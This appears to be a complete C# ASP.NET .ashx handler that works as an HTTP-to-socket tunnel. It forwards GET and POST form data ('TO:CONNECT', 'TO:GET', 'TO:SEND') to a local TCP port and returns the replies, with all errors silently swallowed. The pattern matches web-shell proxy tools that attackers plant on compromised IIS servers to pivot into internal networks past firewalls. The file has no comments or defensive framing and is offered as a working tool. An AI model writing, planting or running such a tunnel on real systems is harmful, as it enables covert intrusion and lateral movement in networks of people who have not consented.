<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;

public class GenericHandler1 : IHttpHandler, 
System.Web.SessionState.IRequiresSessionState
{
    public void ProcessRequest (HttpContext context) {
        try
        {
            String HOST = "127.0.0.1";
            int PORT = 64535;
            if (context.Request.HttpMethod == "GET")
            {
                Socket socket = new Socket(AddressFamily.InterNetwork,SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(HOST), PORT);
                socket.Connect(endPoint);
                byte[] msg = Encoding.UTF8.GetBytes("TO:CONNECT");
                byte[] res = new byte[4096];
                socket.Send(msg, msg.Length,0);
                socket.Receive(res);
                context.Response.Write(Encoding.UTF8.GetString(res));
                socket.Close();
            }
            if (context.Request.HttpMethod == "POST" && context.Request.Form.Get("DataType") != null)
            {
                Socket socket = new Socket(AddressFamily.InterNetwork,SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(HOST), PORT);
                socket.Connect(endPoint);
                socket.ReceiveTimeout = 3000;
                if (context.Request.Form.Get("DataType") == "GetData"){
                    byte[] msg = Encoding.UTF8.GetBytes("TO:GET");
                    socket.Send(msg, msg.Length,0);
                    byte[] res = new byte[1046616];
                    try{
						socket.Receive(res);
                        context.Response.Write(Encoding.UTF8.GetString(res));
                    }catch{
                        context.Response.Write("NO DATA");
                    }
                }else if (context.Request.Form.Get("DataType") == "PostData" && context.Request.Form.Get("Data") != null){
                    byte[] msg = Encoding.UTF8.GetBytes("TO:SEND:"+context.Request.Form.Get("Data"));
                    socket.Send(msg, msg.Length,0);
                }
                socket.Close();
            }  
        }
        catch (Exception exKak)
        {
        }
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }

}